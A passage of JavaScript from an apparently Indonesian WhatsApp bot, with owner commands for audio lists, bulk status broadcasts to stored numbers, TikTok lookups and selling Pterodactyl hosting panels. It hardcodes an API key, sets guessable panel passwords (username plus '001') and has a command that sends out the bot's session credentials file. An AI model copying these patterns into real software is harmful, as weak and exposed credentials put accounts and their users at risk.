qyuunee.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break

case 'addvn':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'delvn':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break

case 'listvn':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 let teksooo = '⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `⭔ ${x}\n`
}
reply(teksooo)
}
break

case 'addlist':
if (!isCreator) return reply('*Lu Bukan Owner*')
if (!m.isGroup) return
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return reply(`Usage Example: ${prefix+command} *name@item*`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
let { TelegraPh } = require('./lib/uploader')
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!isCreator) return reply('*Lu Bukan Owner*')
if (!m.isGroup) return 
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!q) return reply(`Usage Example: ${prefix + command} *panel*`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
reply(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
reply(teks)
}
break

case 'addmsg': {
if (!isCreator) return reply(mess.owner)
loading()
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) reply `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) reply `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break

case 'sendlist': {
if (!isCreator) return reply(mess.owner)
loading()
 if (!text) reply `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) reply `'${text}' tidak terdaftar di list pesan`
 qyuunee.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break

case 'listmsg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}
break

case 'delmsg': case 'deletemsg': {
if (!isCreator) return reply(mess.owner)
loading()
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break

case 'getmsg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) reply `'${text}' tidak terdaftar di list pesan`
 qyuunee.copyNForward(from, msgs[text.toLowerCase()], true)
}
break

case 'google': {
 if (!text) reply `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break

case 'couple': {
loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
qyuunee.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
qyuunee.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break

case 'getname': {
loading()
if (qtod === "true") {
namenye = await qyuunee.getName(m.quoted.sender)
reply(namenye)
} else if (qtod === "false") {
qyuunee.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break

case 'getpic': {
loading()
if (qtod === "true") {
try {
pporg = await qyuunee.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
qyuunee.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await qyuunee.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
qyuunee.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break



case "setppbot": {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await qyuunee.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await qyuunee.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses`)
} else {
var memeg = await qyuunee.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
        break

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!/image/.test(mime)) reply `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) reply `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await qyuunee.downloadAndSaveMediaMessage(m)
await qyuunee.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply('done')
}
break

case 'restart':
                if (!isCreator) return
                reply(`🕊️ Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            
case 'block': {
if (!isCreator) return reply(mess.owner)
loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return reply(mess.owner)
loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'stalktiktok':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=haikalgans`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
qyuunee.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break

case 'listpnl':
case 'listpanel':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
reply("乂 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗣𝗔𝗡𝗘𝗟 乂\n\n📮RAM 1GB CPU 30% 3K/BULAN\n📮RAM 2GB CPU 50% 5K/BULAN\n📮RAM 3GB CPU 70% 8K/BULAN\n📮RAM 4GB CPU 90% 10K/BULAN\n📮RAM 5GB CPU 110% 12K/BULAN\n\n📮RAM - CPU UNLIMITED 15K/BULAN\n\n🍁– FRESH\n🍁– ANTI DELAY\n🍁– GA BOROS KUOTA\n🍁– GA MENUHIN MEMORI\n🍁– BISA BUAT RUN BOT NO RIBET\n🍁– WEBSITE CLOSE BOT TETAP ON\n\n🔰「 BUY PANEL BOT 」\nhttps://wa.me/6289508082845")
break

case 'afk': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`😓 Yahh, Kak *${pushname}*... Telah Afk\n\n ❏  *Alasan* ${text ? ': ' + text : ''}`)
}
break

case 'buatsw':{
if (!isCreator) return reply(mess.owner)
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = qyuunee.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = qyuunee.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
await loading ()
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case "buatswimage":{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!quoted) reply `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) reply `Balas image dengan caption *${prefix + command}*`
const media = await qyuunee.downloadAndSaveMediaMessage(quoted)
qyuunee.sendMessage('status@broadcast', { image: { url: media }, caption: `${text}` }, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case "buatswvideo":{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!quoted) reply `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) reply `Balas video dengan caption *${prefix + command}*`
const media = await qyuunee.downloadAndSaveMediaMessage(quoted)
qyuunee.sendMessage('status@broadcast', { video: { url: media }, caption: `${text}` }, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'swin':{
if (!isCreator) return reply(mess.owner)
await loading ()
if (!text) return reply(`masukin text nya`)
qyuunee.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'vnsw':{
if (!isCreator) return reply(mess.owner)
await loading ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
qyuunee.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di Database*`)
break

case 'inisw':{
if (!isCreator) return reply(mess.owner)
await loading ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
qyuunee.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://ikankoi.my.id',
title: `Koi`,
sourceUrl: `https://ikankoi.my.id`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

case 'hapusdb':
if (!isCreator) return reply(mess.owner)
await loading ()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289508082845@s.whatsapp.net`)
yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
unnnp = pengguna.indexOf(yakiii)
pengguna.splice(unnnp, 1)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
break

case 'listdb':
if (!isCreator) return reply(mess.owner)
await loading ()
if (isBan) return reply('*Lu Di Ban Owner*')
 teksoooo = '▧ 「 *L I S T - D B* 」\n\n'
for (let i of pengguna) {
teksoooo += `- ${i}\n`
}
teksoooo += `\n*Total : ${pengguna.length}*`
qyuunee.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break

case 'getdb': {
            if (!isCreator) return reply(mess.owner)
            loading()
            let sesi = await fs.readFileSync('./src/database.json')
            qyuunee.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: koi })
            }
        break

case 'getuser': {
            if (!isCreator) return reply(mess.owner)
            loading()
            let sesi = await fs.readFileSync('./database/user.json')
            qyuunee.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'user.json' }, { quoted: koi })
            }
        break

            case 'getsession': {
                if (!isCreator) return reply("?")
                
                let sesi = fs.readFileSync('./session/creds.json')
                qyuunee.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: koi
                })
                }
            break
            
case 'getch':
case 'getchannel': {
if (!isCreator) return reply(mess.owner)
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
if (!m.quoted) return reply('reply pesan saluran')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
let teks = '```Channel Name:```' + ' `' + `${id.newsletterName}` + '`\n'
teks += '```Channel Id:```' + ' `' + `${id.newsletterJid}` + '`'
await qyuunee.reply(m.chat, teks.trim(), m)
} catch (e) {
reply('Harus chat dari channel')
}
}
break

case "buatswptv":
{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!m.quoted) reply `Balas Video Dengan Caption ${prefix + command}`
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
qyuunee.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

case 'toptv':
{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!m.quoted) reply `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
qyuunee.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break

        case "1gb": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`*DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}

break
case "2gb": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "50"
let disk = "2048"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "70"
let disk = "3072"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "90"
let disk = "4048"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/8ed6c29472e8253e20495.jpg" 
if (!u) return
let d = (await qyuunee.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`
qyuunee.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: koi })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
